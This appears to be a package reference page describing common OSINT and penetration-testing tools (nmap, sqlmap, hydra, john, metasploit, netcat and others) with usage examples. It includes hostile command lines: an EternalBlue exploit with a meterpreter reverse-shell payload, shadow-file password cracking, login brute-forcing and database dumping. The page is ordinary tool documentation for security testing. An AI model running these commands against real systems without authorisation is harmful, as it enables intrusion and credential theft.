# OSINT & Security

Package file: `packages/osint-security.yaml`

---

## `nmap`

Network scanner.

### Description
`nmap` is the industry-standard network discovery and security auditing tool. It performs port scanning, OS detection, version detection, and scriptable vulnerability checks.

### Usage
```bash
# Scan ports on a host
nmap 192.168.1.1

# Scan a range
nmap 192.168.1.1-254

# Aggressive scan with version detection
nmap -A 192.168.1.1

# Fast top ports
nmap -F scanme.nmap.org

# Run NSE scripts
nmap --script vuln 192.168.1.1

# Stealth SYN scan
sudo nmap -sS 192.168.1.1
```

---

## `theHarvester`

OSINT harvester.

### Description
`theHarvester` gathers emails, subdomains, hosts, employee names, open ports, and banners from public sources using search engines and APIs.

### Usage
```bash
# Search emails and hosts for a domain
theHarvester -d example.com -b all

# Use a specific source (e.g., Bing)
theHarvester -d example.com -b bing

# Save results
theHarvester -d example.com -b all -f results.html
```

---

## `recon-ng`

Web recon framework.

### Description
`recon-ng` is a full-featured Web Reconnaissance framework written in Python. It provides an interactive console with modules for gathering OSINT data via APIs.

### Usage
```bash
# Start the console
recon-ng

# Inside the console:
# marketplace refresh
# marketplace install recon/domains-hosts/virustotal
# modules load recon/domains-hosts/virustotal
# options set SOURCE example.com
# run
```

---

## `amass`

Network mapping (OWASP).

### Description
`amass` is an OWASP tool for in-depth DNS enumeration and network mapping of attack surfaces. It integrates dozens of data sources and supports graph output.

### Usage
```bash
# Enumerate subdomains
amass enum -d example.com

# Passive enumeration only
amass enum -passive -d example.com

# Output to a directory with graphs
amass enum -d example.com -o amass-out

# View the database
amass db -list
```

---

## `mitmproxy`

Intercepting proxy.

### Description
`mitmproxy` is an interactive man-in-the-middle proxy for HTTP/HTTPS traffic. It lets you inspect, modify, and replay requests from the terminal or a web interface.

### Usage
```bash
# Start the terminal UI
mitmproxy

# Start the web interface
mitmweb

# Run as a transparent proxy
mitmproxy --mode transparent

# Export a flow to curl command
# Select a flow and press 'e' -> 'r' in mitmproxy
```

---

## `sqlmap`

SQL injection.

### Description
`sqlmap` is an open-source penetration testing tool that automates the detection and exploitation of SQL injection flaws and database server takeovers.

### Usage
```bash
# Test a URL for SQLi
sqlmap -u "https://example.com/page?id=1"

# Dump database tables
sqlmap -u "https://example.com/page?id=1" --dump

# Get current database user
sqlmap -u "https://example.com/page?id=1" --current-user

# Post request testing
sqlmap -u "https://example.com/login" --data="user=admin&pass=1"
```

---

## `netcat`

TCP/UDP Swiss-knife.

### Description
`nc` is a networking utility for reading from and writing to network connections using TCP or UDP. It is used for port scanning, banner grabbing, file transfers, and backdoors.

### Usage
```bash
# Connect to a port
nc -v 192.168.1.1 80

# Listen on a port
nc -l -p 1234

# Transfer a file (receiver)
nc -l -p 1234 > received_file

# Transfer a file (sender)
nc 192.168.1.2 1234 < file_to_send

# Port scan a range
nc -zv 192.168.1.1 20-80
```

---

## `hydra`

Login brute-force.

### Description
`hydra` is a parallelized login cracker supporting many protocols including SSH, FTP, HTTP, RDP, and databases. It is used for authorized security testing.

### Usage
```bash
# Brute-force SSH
hydra -l admin -P passwords.txt ssh://192.168.1.1

# Brute-force HTTP form
hydra -l admin -P passwords.txt 192.168.1.1 http-post-form "/login:user=^USER^&pass=^PASS^:F=invalid"

# Brute-force FTP
hydra -L users.txt -P passwords.txt ftp://192.168.1.1
```

---

## `john`

John the Ripper.

### Description
`john` is a fast password cracker. It detects password hash types automatically and can crack hashes using wordlists, rules, and incremental modes.

### Usage
```bash
# Crack password hashes from a file
john hashes.txt

# Use a specific wordlist
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt

# Show cracked passwords
john --show hashes.txt

# Crack a shadow file
unshadow /etc/passwd /etc/shadow > mypasswd
john mypasswd
```

---

## `metasploit`

Pentest framework.

### Description
`metasploit` (`msfconsole`) is a comprehensive penetration testing framework. It includes exploit modules, payloads, auxiliary scanners, and post-exploitation tools.

### Usage
```bash
# Launch the console
msfconsole

# Search for an exploit
search type:exploit platform:windows

# Use and configure an exploit
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.10
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.5
exploit
```

---

## `subfinder`

Subdomain discovery.

### Description
`subfinder` is a fast, passive subdomain discovery tool from ProjectDiscovery that queries multiple data sources concurrently.

### Usage
```bash
# Enumerate subdomains for a domain
subfinder -d example.com

# Output to a file
subfinder -d example.com -o subs.txt

# Use all available sources
subfinder -d example.com -all

# Pipe into other tools
subfinder -d example.com | httprobe
```

---

## `ffuf`

Fast web fuzzer.

### Description
`ffuf` is a fast web fuzzer written in Go. It brute-forces directories, virtual hosts, GET/POST parameters, and values using wordlists and filters.

### Usage
```bash
# Directory fuzzing
ffuf -u https://example.com/FUZZ -w /usr/share/wordlists/dirb/common.txt

# Virtual host discovery
ffuf -u https://example.com -H "Host: FUZZ.example.com" -w vhosts.txt

# Parameter fuzzing
ffuf -u "https://example.com/page?FUZZ=1" -w params.txt

# Filter by response size
ffuf -u https://example.com/FUZZ -w words.txt -fs 4242
```

---

## `nuclei`

Vuln templates.

### Description
`nuclei` is a fast vulnerability scanner that uses community and custom templates. It works well in CI/CD pipelines and can scan thousands of hosts concurrently.

### Usage
```bash
# Scan a single host with all templates
nuclei -u https://example.com

# Scan a list of URLs
nuclei -l urls.txt

# Run a specific template
nuclei -u https://example.com -t cves/2024/CVE-2024-XXXX.yaml

# Output to JSON
nuclei -u https://example.com -o results.json -j
```

---

## `sherlock`

Social username search.

### Description
`sherlock` hunts down social media accounts by a username across hundreds of sites. It helps map a target's digital footprint during OSINT investigations.

### Usage
```bash
# Search a username
sherlock john_doe

# Search multiple usernames
sherlock john_doe jane_doe

# Output to a directory
sherlock john_doe --folderoutput results/

# With a timeout
sherlock john_doe --timeout 10
```
